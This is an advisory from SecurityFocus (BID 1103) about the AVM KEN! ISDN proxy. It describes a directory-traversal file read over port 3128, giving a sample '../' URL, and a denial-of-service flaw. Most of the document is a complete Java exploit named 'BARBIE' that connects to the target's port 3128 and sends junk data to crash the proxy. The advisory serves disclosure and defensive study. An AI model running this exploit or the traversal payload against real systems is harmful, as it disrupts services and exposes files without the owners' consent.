source: http://www.securityfocus.com/bid/1103/info

A remote user on the local network is capable of retrieving any known file from a machine running AVM KEN!. This is accomplished by appending ../ to a URL utilizing port 3128 to escape the regular web file structure, and appending the remaining path onto the request.
eg.
http://target:3128/../../../filename.ext

A denial of service attack could also be launched against AVM KEN! by sending random characters to port 3128. A restart would be required in order to regain normal functionality. 

import java.net.Socket;
import java.io.*;

/*
BARBIE - The AVM KEN! exploit

This exploit causes a crash in the AVM KEN! ISDN Proxy software.
All conections will be cut off, but the server will restart again, 
a few seconds later.

Tested with AVM KEN! Version 1.03.10 (german)
*/

class barbie {

String adress;

public void killken() { 
PrintWriter out = null;
try{
    Socket connection = new Socket( adress, 3128);
    System.out.println("");
    System.out.println("killing..."); 
    out  = new PrintWriter(connection.getOutputStream(), true);
    out.println("Whooopppss_Ken_died");
    connection.close();
   }
catch (IOException e)
{
System.out.println("");
System.out.println(" Can't met Ken! ");
}  
}


public static void main (String arguments[]) {
barbie kk = new barbie();
if(arguments.length < 1)
{
System.out.println("");
System.out.println("usage: java barbie <adress/ip>");
System.exit(1);
}
kk.adress = arguments[0];
kk.killken();
}

}
